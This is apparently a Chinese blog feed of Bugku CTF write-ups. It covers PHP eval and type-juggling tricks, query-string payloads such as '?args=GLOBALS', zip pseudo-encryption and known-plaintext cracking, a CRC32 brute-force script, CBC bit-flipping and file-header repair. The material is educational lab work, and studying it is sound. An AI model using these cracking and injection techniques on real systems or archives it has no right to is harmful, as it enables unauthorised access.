    <url>%2F2019%2F01%2F25%2F201919%2F</url>
    <content type="text"><![CDATA[变量1-writeup打开题目点击访问链接得到一串php代码提示1234567891011121314&lt;?php error_reporting(0); //关闭错误报告（报错不显示）include "flag1.php"; //引用flag1.php文件代码highlight_file(__file__); //语法高亮if(isset($_GET['args']))&#123; //检查变量是否声明 $args = $_GET['args']; //赋值给变量$args if(!preg_match("/^\w+$/",$args))&#123; //!preg_match 不匹配, ^匹配字符串的开始，\w匹配字母或数字或下划线或汉字等价于'[^A-Za-z0-9_]',$匹配字符串的结束 这里达到过滤作用。 die("args error!"); //输出args error!并退出当前脚本 &#125; eval("var_dump($$args);");//eval()将字符串作为php代码执行,var_dump()函数 打印变量的相关信息,显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。$$args可变变量&#125;?&gt; 12345678910可变变量（Variable variables）可变变量是一种独特的变量，他允许动态改变一个变量的名称。其工作原理是该变量的名称由另外一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”。下面举一个例子，实例代码如下：&lt;?php$args = "xiaowei"; //声明变量$args$xiaowei = "www.axiaowei.cn"; //声明变量$xiaoweiecho $args; //输出变量$argsecho "\n"; //换行echo $$args; //通过可变变量输出$xiaowei的值?&gt; 再看提示的第一句话flag in the variable! （#flag在变量中）上述的可变变量简单来说$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名我们测试php的中的超全局变量，将其变量名传入1234567891011超全局变量 — 超全局变量是在全部作用域中始终可用的内置变量超全局变量:$GLOBALS：[一个包含了全部变量的全局组合数组]$_SERVER:[是预定义服务器变量的一种,所有$_SERVER开头的都是预定义服务变量]$_GET：[用于获取url地址栏的参数数据]$_POST： [用于接收post提交的数据]$_FILES：[用于文件就收的处理img 最常见]$_COOKIE： [用于获取与setCookie()中的name 值]$_SESSION： [用于存储session的值或获取session中的值]$_REQUEST：[具有get,post的功能，但比较慢]$_ENV：[ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它] 直接构造payload：?args=BLOBLAS]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>变量</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-本地包含]]></title>
    <url>%2F2019%2F01%2F25%2F201918%2F</url>
    <content type="text"><![CDATA[本地包含-writeup访问链接，显示123，查看源代码，没有任何提示，尝试了几个常见的本地包含的姿势，输入什么都是123,也不报错，并没有什么用试着用御剑扫描一下，出来了个flag.php（没有的可以自己往字典里加）访问flag出来了（很迷？？？）个人感觉这个环境应该是已经玩坏了-_-!]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-你必须让他停下]]></title>
    <url>%2F2019%2F01%2F24%2F201917%2F</url>
    <content type="text"><![CDATA[你必须让他停下-writeup打开题目点击访问链接，无限刷新，查看源代码发现js中，如下：12345function myrefresh()&#123; //声明一个函数window.location.reload(); //重新加载当前文档。&#125;setTimeout('myrefresh()',500); //在指定得毫秒数（500）调用函数1000毫秒 = 1秒 你也可以跟我一样，那么准，当显示10.jpg（大概有15张jpg）得页面得时候按pc上的ESC，让页面停止，按F12查看flag想其flag显示在页面上可以把标签中得style=”display:none”中去掉就可以了（并没有什么用，能得到flag就可以了）12display:none将元素的显示设为无，即在网页中不占任何的位置。 我讲一下其他几种方式吧，毕竟上面得操作有点看手速[掩面]view-source 可以利用view-source:查看源代码，然后在当前页面一直刷新（F5），直到flag出现。 抓包工具(这里我用得是burp suite)抓取到页面，发送到Repeater，一直点击go，很快就会出现得]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-域名解析]]></title>
    <url>%2F2019%2F01%2F24%2F201916%2F</url>
    <content type="text"><![CDATA[域名解析-writeup打开题目：首先打开链接，访问显示404根据题目要求把flag.baidu.com解析到123.206.87.240应该就可以拿到flagWindows平台修改C:\Windows\System32\drivers\etc下得hosts文件添加一条解析记录（如果出现修改权限不足的问题，可以利用替换）然后访问flag.baidu.com就可以看到flag了。Linux平台（如kali）直接编辑etc/hosts文件添加一条解析记录一样，直接访问flag.baidu.com就可以到flag了 12hostHosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-一个普通的压缩包(xp0intCTF)]]></title>
    <url>%2F2019%2F01%2F23%2F201911%2F</url>
    <content type="text"><![CDATA[一个普通的压缩包(xp0intCTF)-writeup打开题目下载得到一个rar压缩包附件，解压打开发现还有一个flag.rar，文件属性，详细信息各种查看确定没有隐藏信息，进行再次解压出现提示png文件损坏先打开里面的文本看一下，文本内容提示flag is not here，现在把flag.rar放在十六进制工具里看下，发现里面有一张secret.png文件，但是之前提示损坏了，刚开始用winrar自带的修复功能修复不成功，只能自己用010Editor进行手动修复了。检查rar头，没有问题，然后再看加密部分，检查各个文件的文件头12文件头（FILE_HEAD）HEAD_TYPE 1 个字节 头类型：0x74 更多可以点击RAR文件格式研究我们回到我们的题目中来，检查发现png那的文件头类型A8 3C 7A，把7A修改为74，保存，查看是否修复成功。得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件1GIF文件头标识 (6 bytes) 47 49 46 38 39(37) 61—— GIF89(7)a 修改为gif用stegsolve查看得到gif的两帧每一帧有半张二维码(这里也可以用Photoshop进行分离图层)123456StegSolveAnalyse下面几个功能键作简单介绍：File Format:文件格式，这个主要是查看图片的具体信息Data Extract:数据抽取，图片中隐藏数据的抽取Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看Image Combiner:拼图，图片拼接 用Photoshop将这两块进行拼接成完整的二维码，利用QR扫描（手机扫也一样的）得到flag二维码的生成细节和原理有兴趣的可以去了解下。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip文件格式说明]]></title>
    <url>%2F2019%2F01%2F22%2F201914%2F</url>
    <content type="text"><![CDATA[zip文件格式zip文件由三部分组成：压缩的文件内容源数据、压缩的目录源数据、目录结束标识的结构①压缩文件内容的源数据：记录着压缩的所有文件的内容信息，其数据组织结构是对于每个文件都由File header 、File data 、 Data descriptor 三部分组成。File header（文件头）：用于标识该文件的开始，结构说明如下：File data(文件数据)：相应压缩文件的源数据。Data descriptor（数据描述符）：用于标识该文件压缩结束，该结构只有在相应的local file header中通用标记字段的第３bit设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。②Central directory 核心目录记录了压缩文件的目录信息，在这个数据区中每一条记录对应再压缩源文件数据区中的一条数据。核心目录结构：③End of central directory record(EOCD) 目录结束标识目录结束标识存于整个归档包的结尾，用于标记压缩目录数据的结束。每个压缩文件必须有且只有一个EOCD记录。 官方文档：https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ZIP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip压缩包--加密破解篇]]></title>
    <url>%2F2019%2F01%2F22%2F201915%2F</url>
    <content type="text"><![CDATA[伪加密、爆破、明文攻击、CRC32碰撞zip文件格式：zip文件由三部分组成：压缩的文件内容源数据、压缩的目录元数据、目录结束标识结构详情点击：zip格式说明 zip伪加密若是没有加密的zip文件，两处标记都是00 00如果是加密的zip文件，两处都标记的是09 00（注意不同的压缩软件有差异，有些好像是01 00）若将未加密的zip文件中的压缩源文件目录区的全局方式位标记改为01 00 （或者09 00），就会被压缩软件认为已加密，这就是所谓的伪加密了破解伪加密的zip，只要把压缩文件目录区的全局方式标记改为00 00 （除windows外的系统（如kali）可直接打开伪加密压缩包） 爆破爆破：逐个尝试选定集合中的可以组成的所有密码，直到遇到正确的密码。分为暴力破解、掩码破解、字典破解这几种1、暴力破解：选择密码范围，长度等，由软件组合生成密码进行破解2、掩码破解：知道密码中的一部分，只需要按照规则构造其余部分进行破解3、字典破解：通常是多数用户常用的一些密码集合，导入字典文件用字典中的密码进行破解（取决你的字典）这里可以使用Windows下的一款神器AZPR，也可以自己动手用python写个爆破的脚本。 明文攻击明文攻击（Known plaintext attack）：是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。明文攻击是一种较为高效的攻击手段，如：当你不知道一个zip压缩包文件的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有压缩文件使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。简单来说就是，zip明文攻击就是利用已知文件找到加密密钥，利用密钥来解释其他加密文件，因为zip压缩包里的所有文件都是使用同一个加密密钥来加密的。这里举个例子：现在我压缩了带密码的四个文件，已知明文攻击测试.zip中的明文攻击.docx进行对已知文件进行压缩，对比crc值是否跟加密文件中的crc值一致利用AZPR进行明文攻击成功获取到密文注意：当明文的大小比较小时，或者密文过长，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的，如果出现错误可以多试几款压缩软件。 CRC32碰撞CRC32：CRC本身是“冗余校验码”的意思，CRC32则标识会产生一个32bit（8位十六进制）的校验值。 CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。 每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能力，通常只适用于较小文本文件。 案例：可以参考我写的Bugku-好多压缩包那篇文章。bugku中的例子脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8import binasciiimport stringimport zipfileimport base64dicts = string.printable # 可打印字符的字符串。ascii码33-126号def collision_crc(crc): global out_file for a in dicts: for b in dicts: for c in dicts: for d in dicts: strings = a + b + c + d strings = strings.encode('utf-8') if crc == (binascii.crc32(strings)): out_file.write(strings.decode('utf-8')) # print(strings) return # 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件def obtain_zip(): for i in range(68): file = 'out' + str(i) + '.zip' zip_file = zipfile.ZipFile(file, 'r') # 读取创建zip_file对象 get_crc = zip_file.getinfo('data.txt') # 压缩文件夹里的data.txt文件，获取文档内指定的文件信息 crc = get_crc.CRC # 以上定义一个方法，获取68个zip的CRC的值 collision_crc(crc) # 再调用collision方法传参out_file = open('out.txt', 'w')obtain_zip()out_file.close()out_file2 = open('out.txt', 'r')with open('flag.rar', 'wb') as rar: rar.write(base64.b64decode(out_file2.read())) # 二进制将转换后的base64位写入文件]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
        <tag>加密</tag>
        <tag>爆破</tag>
        <tag>ZIP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-好多压缩包]]></title>
    <url>%2F2019%2F01%2F21%2F201906%2F</url>
    <content type="text"><![CDATA[好多压缩包-writeup打开题目得到一个压缩包附件，进行解压，查看到里面有68个压缩包打开68个文件发现里面每个压缩包里都有一个四个字节大小的txt文档（加密），首先尝试下是不是伪加密，发现不是尝试下爆破无果。。。然后想了下，这么多压缩包，不可能让我们爆破吧，尝试下crc32碰撞CRC32碰撞可以参考我写的文章zip压缩包–加密篇**分析里面得文件得四个字节，想着应该是英文，中文字符得话跟爆破没区别…猜测里面为四个字符（英文），获取zip文件得crc32值，进行crc碰撞碰撞出来发现是一串base64，拿去解密(有些网站解码不了，解码了也是有问题的，多尝试几个)，放入winhex，发现导入进去的时候老是有问题，我不知道怎么处理，莫名其妙的多了很多空格，搜索了下感觉他们很顺利的就放进去了尝试多次发现无果。然后无奈就自己写python实现直接base64解密后直接写入文件里python脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8import binasciiimport stringimport zipfileimport base64dicts = string.printable # 可打印字符的字符串。ascii码33-126号def collision_crc(crc): global out_file for a in dicts: for b in dicts: for c in dicts: for d in dicts: strings = a + b + c + d strings = strings.encode('utf-8') if crc == (binascii.crc32(strings)): out_file.write(strings.decode('utf-8')) # print(strings) return # 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件def obtain_zip(): for i in range(68): file = 'out' + str(i) + '.zip' zip_file = zipfile.ZipFile(file, 'r') # 读取创建zip_file对象 get_crc = zip_file.getinfo('data.txt') # 压缩文件夹里的data.txt文件，获取文档内指定的文件信息 crc = get_crc.CRC # 以上定义一个方法，获取68个zip的CRC的值 collision_crc(crc) # 再调用collision方法传参 out_file = open('out.txt', 'w')obtain_zip()out_file.close()out_file2 = open('out.txt', 'r')with open('flag.rar', 'wb') as rar: rar.write(base64.b64decode(out_file2.read())) # 二进制将转换后的base64位写入文件 运行完成后将写出的文件，打开发现打开失败，导入16进制编辑器，观察数据，发现存在rar的文件尾C4 3D 7B 00 40 07 00，但缺少文件头，于是补上rar的文件头52 61 72 21 1A 07 00，发现文件修复成功，解压发现是一个flag在压缩包注释上。二进制上也可以看到CMT，CMT即为comment（注释） 这里说明下我之前base64导入进去的出现的问题，因为心里一直纳闷，所以去多次尝试发现需要利用notepad++32位的进行base64解密，就可以得到正确的值，保存为.rar文件，然后进行导入十六进制编辑工具里是可以实现的。（之前用的时notepad++64位的会出现解密不出来的情况，几个在线工具解密出来的值都是错误的或者跟上面导进去不知道为什么多了很多空格这些）这里举几个对比：]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-怀疑人生]]></title>
    <url>%2F2019%2F01%2F20%2F201907%2F</url>
    <content type="text"><![CDATA[怀疑人生–wirteup打开题目得到一个附件，发现是zip的文件头，直接在后缀上加上一个.zip。解压，发现三个文件。第一个需要解压密码，先看下其他文件有没有其他hint直接丢进kali，分析一波，分离ctf2.jpg得到一个压缩包解压，里面存在一个txt文本，发现一串加密得密文Brainfuck/Ook!编码，拿去Ook解密来看这个奇怪得二维码，直接那QR扫以下看下有什么信息，得到内容折腾了挺久也好像没有其他信息了，字典破解，尝试下，还真有！解压得到一串base64，进行base64解密，得到一串unicode，进行解密解密后进行拼接，提交发现失败，尝试多次，很纳闷，感觉不对劲，中间那Ook解密后感觉还是一个密文，查了一下是一个base58？？？进行解密得到明文，进行ctf1+ctf2+ctf3进行拼接，提交成功。1234567891011121314151617此题出现了几种编码：base64:Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。base58:Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址,相比Base64，Base58不使用数字"0"，字母大写"O"，字母大写"I"，和字母小写"l"，以及"+"和"/"符号.Unicode:Unicode又称（统一码、万国码、单一码）世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。Brainfuck/Ook:Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。OOK！是一种为红毛猩猩设计的编程语言。OOK！与众所周知的深奥语言BrainF ***基本上是同构的 ，但语法元素更少。详情可跳转至http://www.dangermouse.net/esoteric/ook.html二维码:二维码又称二维条码，常见的二维码为QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>base64</tag>
        <tag>Brainfuck</tag>
        <tag>Ook</tag>
        <tag>Unicode</tag>
        <tag>base58</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击]]></title>
    <url>%2F2019%2F01%2F20%2F201913%2F</url>
    <content type="text"><![CDATA[待更新…..]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CBC字节翻转攻击原理]]></title>
    <url>%2F2019%2F01%2F20%2F201912%2F</url>
    <content type="text"><![CDATA[CBC字节翻转攻击原理 CBC模式：Cipher Black Chaining mode (密码分组链接模式)CBC模式进行加解密是都需要一个随机初始向量iv，在第一轮进行加解密是都需要与iv进行xor的。 任何字符与本身xor都是为0，任何字符与0xor都为本身，如A xor A=0，A xor 0=A 加密过程1、将明文分为若干组（16个字节为一组），最后一组不足则用特殊字符填充2、生成一个初始向量iv和key密钥3、用iv与第一组明文异或（iv只影响第一组生成的密文）生成密文4、然后再用前n组密文与后n+1组明文异或生成第n+1组密文，以次重复5、最后将生成的密文拼接起来，就成了最终密文加密公式：Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块 解密过程：1、将密文分组2、用iv与第一组密文xor，解密得到第一组明文3、用第n组密文与第n+1组密文xor，解密得到第n+1组明文，以此类推4、将各组的明文拼接在一起就是最终要得到的明文了 注意一下：解密的时候前一组密文只影响后一组明文的结果，而不会影响其他组明文的结果，由图也可看得出，这个也是进行攻击的重要之处。 有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2： CBC字节翻转攻击原理图http://processon.com/chart_image/5c37fd8de4b0db2e59306630.png123456XOR异或运算异或，英文为exclusive OR，缩写成xor异或的数学符号为“⊕”异或略称为XOR、EOR、EX-OR程序中有三种演算子：XOR、xor、⊕。两个输入相同时为0，不同则为1]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>加密</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-论剑]]></title>
    <url>%2F2019%2F01%2F20%2F201909%2F</url>
    <content type="text"><![CDATA[论剑-writeup因为很少人做出来，导致网上很少这个wp（找不到），所以我在这里记录下解题思路打开题目访问链接，把图片下载下来另存为先把它丢进kali上binwalk扫描以下，发现有隐藏文件，foremost直接分离出来，得到两张图片把图片都拿去二进制编辑工具查看下，在原图上搜索下FFD9（jpg的结束标识），发现有两个，以及一段二进制文件，很可疑这段二进制拿去转ASCII码，得到mynameiskey!!!hhh 折腾了下，暂时先放着。什么详细信息、备注都毫无hint，想着修改图片高度看下，发现新大陆，但是隐藏了一部分-_-!把分离出来的图片都修改高度，发现跟原图一样，无果天坑，这里想打si作者的环节，在分离出来的两张图片，以及这段这段二进制狂下功夫，xor、盲水印、色道分析..折腾了一段时间并没有什么用查看二进制那段信息发现，看到BC AF 27 1C好熟悉，好像特征码给改过，尝试修改,修复文件头12345678910111213141516171819常见的文件头：7z文件头标识：37 7A BC AF 27 1CJPEG/JPG文件头标识: ff, d8 (SOI) (JPEG 文件标识) 文件结束标识: ff, d9 (EOI) PNG文件头标识：89 50 4E 47 0D 0A 1A 0AGIF文件头标识：47 49 46 38 39(37) 61--- GIF89(7)aBMP文件头标识：42 4D--- BMHTML (html)文件头标识：68746D6C3E ZIP Archive (zip)文件头标识：504B0304 --- PKRAR Archive (rar)文件头标识：52617221 等等.. 丢回kali用binwalk分析，发现多了一个压缩包，分离，注意使用foremost分离不出来，利用dd分离出来123456使用dd命令分离文件，如:dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163if=file（源文件）of=file（输出文件）bs=bytes（一次性转换bytes个字节，及转换缓冲区大小）skip=blocks（输入文件开头跳过blocks个块再开始复制--通俗点讲就是从哪开始） 进行解压，需要密码，用二进制转的ASCII码进行解密，得到一张图片，修改高度，得到另一部分的flag，进行拼接最终得到一个的密文这个不是md5，是一个base16密文，进行base16解密，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>base16</tag>
        <tag>文件头</tag>
        <tag>ASCII</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web3]]></title>
    <url>%2F2019%2F01%2F20%2F201904%2F</url>
    <content type="text"><![CDATA[web3-writeup打开题目点击访问链接，无限弹窗好了，我点烦了，粗暴点直接按（Ctrl+u）直接强制查看源码，也可以自己直接使用view-source:URL，查看源码。得到一段Unicode编码，Burp Suite直接解码，也可以在线的工具，百度一下很多的。123Unicode编码：Unicode码扩展自ASCII字元集。Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-矛盾]]></title>
    <url>%2F2019%2F01%2F20%2F201910%2F</url>
    <content type="text"><![CDATA[矛盾-writeup打开题目访问链接，得到一串代码，又是一道代码审计的题12345678//代码分析$num=$_GET['num']; //Get方式获取参数if(!is_numeric($num)) //is_numeric()函数是否为数字或者数字字符串-&gt;&gt;加个！取反,通俗点讲这里不能为数字&#123;echo $num; //如果不是数字就输出if($num==1) //矛盾吧，上面又不要数字，这里又要是1echo 'flag&#123;**********&#125;'; //如果值为1则输出flag&#125; 根据提示，可以用科学计数法表示1，构造URL：?num=1e0.1 既不是纯数字，其值又等于1 其实还有很多种姿势获取到flag，授人以鱼不如授人以渔。以下讲解几个特征。12345678910php是一个弱类型语言==表示的是等于 ，比较两个变量的值，不比较数据类型。只要数值等于就成立了===表示的是全等，比较的是两个变量的值和类型== 判断时，当数字与字符串比较时，系统先将字符串转化为数字，再与数字进行比较。is_numeric（）函数用于检测变量是否为数字或数字字符串。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，怎么构造有思路了吗？PHP浅谈==和===：https://blog.csdn.net/auuuuuuuu/article/details/79621635科学计数法：https://baike.baidu.com/item/科学记数法/1612882?fr=aladdin]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web基础$_POST]]></title>
    <url>%2F2019%2F01%2F19%2F201905%2F</url>
    <content type="text"><![CDATA[web基础$_POST-writeup打开题目，这是一道简单的post题还是老规矩，点击访问链接，提示给出一串代码，分析代码，一道简单的代码审计。1234$what=$_POST['what']; //post提交数据赋值给变量echo $what;if($what=='flag') //判断post提交的数据是否等于flag，如果true输出flagecho 'flag&#123;****&#125;'; 我们只要post提交的变量what=falg就可以了，这里用一款熟悉的插件工具HackBak点击Execute提交，flag就出来了。1POST提交：向指定的资源提交要被处理的数据。 浅析get与post的区别：定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE（查、改、增、删）四个操作。对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。 GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;相连。 POST把提交的数据则放置在是HTTP包的包体中。POST的安全性要比GET的安全性高。 get是从服务器上获取数据，post是向服务器传送数据。get 和 post只是一种传递数据的方式，get也可以把数据传到服务器，他们的本质都是发送请求和接收结果。只是组织格式和数据量上面有差别，GET和POST只是发送机制不同，并不是一个取一个发！]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web基础$_GET]]></title>
    <url>%2F2019%2F01%2F19%2F201901%2F</url>
    <content type="text"><![CDATA[web基础$_GET-writeup点击访问链接，分析给出的代码1234$what=$_GET['what']; //Get方式获取参数echo $what; if($what=='flag') //这里有个if判断当what的值等于flag时就输出flagecho 'flag&#123;****&#125;'; 分析完代码，我们直接在URL中，后面直接加上?what=flag，Get请求123Get请求：从指定的资源请求数据。GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接。URL中的?号：分隔实际的URL和参数]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-color]]></title>
    <url>%2F2019%2F01%2F19%2F201903%2F</url>
    <content type="text"><![CDATA[color-writeup打开题目点击链接，得到一个压缩包附件，解压打开，7张png格式的图片，哇!你有见过彩虹吗？利用Stegsolve查看每张图片的最低位，发现有变化，组合起来Make Me Tall根据提示的意思，应该需要改变图片的高度发现图片下方有黑白格子，按照黑格子-&gt;1,白格子-&gt;0，转成二进制123456711111111010111101111111110111111101111110000110010101011000101001010010000001101110100110111010101111001101101101011011000111001101101111101 经过几次尝试后发现，这里每一列(巨坑)，七个数字组成一个字符，进行二进制转化ascii码得到flagpython3脚本：12345678910111213141516# coding:utf-8# Bug_ku color# 七张图片下方的黑白格子转换的二进制color1 = '11111111010111101111'color2 = '11111011111110111111'color3 = '00001100101010110001'color4 = '01001010010000001101'color5 = '11010011011101010111'color6 = '10011011011010110110'color7 = '00111001101101111101'# 循环根据下标组合成每一列的二进制for i in range(0, 20): color = color1[i]+color2[i]+color3[i]+color4[i]+color5[i]+color6[i]+color7[i] print(chr(int(color, 2)), end='') # 打印转换后的ASCII码 PNG文件头知识：1234567（固定）八个字节：89 50 4E 47 0D 0A 1A 0A 代表着PNG文件头（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，描述IHDR头部的大小（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）（可变）紧接着13位数据块（IHDR) -前四个字节代表该图片的宽（Width） -后四个字节代表该图片的高（Height） -后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-计算器]]></title>
    <url>%2F2019%2F01%2F19%2F201908%2F</url>
    <content type="text"><![CDATA[计算器-writeup查看题目，访问题目给出的链接查看是一个随机数字运算的验证码，输入结果值发现最大只能输入一位长度的值点击提交看看有什么结果，并没有什么用！浏览器上按F12,审核元素，查看源代码，发现maxlength=”1”,把maxlength=”1”修改为maxlength=”2”把结果值填上，点击验证得到flag 我发现一个骚姿势就是，只要你够耐心的话一直点击刷新，会有意向不到的结果1234567HTML input maxlength属性定义和用法 maxlength 属性规定 &lt;input&gt; 元素中允许的最大字符数。 语法 &lt;input maxlength="number"&gt; 属性值 number 在&lt;input&gt;元素中允许的最大字符串]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web2]]></title>
    <url>%2F2019%2F01%2F19%2F201902%2F</url>
    <content type="text"><![CDATA[web2-writeup可能会写的有点啰嗦，但是我不想跟我一样入门的小白看到教程一脸？？？这是一道20分值的简单题，听说聪明的人都能找到答案直接访问链接这是一个满屏滑稽的页面在浏览器当前页面上直接按F12审查元素，查看源代码，查看到flag也可以利用view-source:sURL查看源代码，查看到flag12345F12:开发人员工具，是开发人员调试利器~ view-source:是一种协议，早在基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于windows pack2以及更高的版本后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器还可以使用。 使用方法： view-source:sURL 回车即可看到当前网页的源代码。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
